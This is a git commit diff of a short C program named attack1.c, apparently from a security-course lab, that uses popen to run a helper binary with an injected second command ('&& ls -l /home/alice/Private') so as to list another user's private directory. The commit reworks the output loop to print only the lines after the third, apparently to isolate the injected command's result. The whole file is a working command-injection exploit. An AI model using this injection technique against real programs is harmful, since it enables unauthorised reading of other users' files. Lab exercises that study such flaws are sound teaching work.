e8c87234a393e378c9496ea14021f1bf8323274d
Blake Gong <blakegong@Blakes-MacBook-Pro.local>
2015-10-31 18:55:28 +0800

    changes

--- attack1.c
+++ attack1.c
@@ -1,14 +1,14 @@
 #include <stdio.h>
 #include <string.h>
-#include <stdlib.h>
-#include <sys/types.h>
-#include <unistd.h>
+
+#define CACHE_MAX 1024
 
 int main(int argc, char *argv[])
 {
 	FILE *fp;
-	char command[512], result[1024], temp[1024];
+	char command[CACHE_MAX], result[CACHE_MAX];
 
+	// strcpy(command, "ls -l ~");
 	strcpy(command, "/home/alice/Public/mysecret \"&& ls -l /home/alice/Private\"");
 
 	fp = popen(command, "r");
@@ -16,19 +16,18 @@ int main(int argc, char *argv[])
 		printf("ERROR");
 
 	int count = 0;
-	while (fgets(result, 1024, fp) != NULL) {
-		strcpy(temp, result);
-//		strcpy(temp, strchr(result, '\n'));
-		printf("%s", temp);
+	while (fgets(result, CACHE_MAX, fp) != NULL) {
+		int i = 0;
+		while (i < CACHE_MAX && result[i] != '\0') {
+			if (count == 3)
+				printf("%c", result[i]);
+			else if (result[i] == '\n')
+				count++;
+			i++;
+		}
 	}
 
-	int status = pclose(fp);
-	if (status == -1) {
-	    /* Error reported by pclose() */
-	} else {
-	    /* Use macros described under wait() to inspect `status' in order
-	       to determine success/failure of command executed by popen() */
-	}
+	pclose(fp);
 
 	return 0;
 }
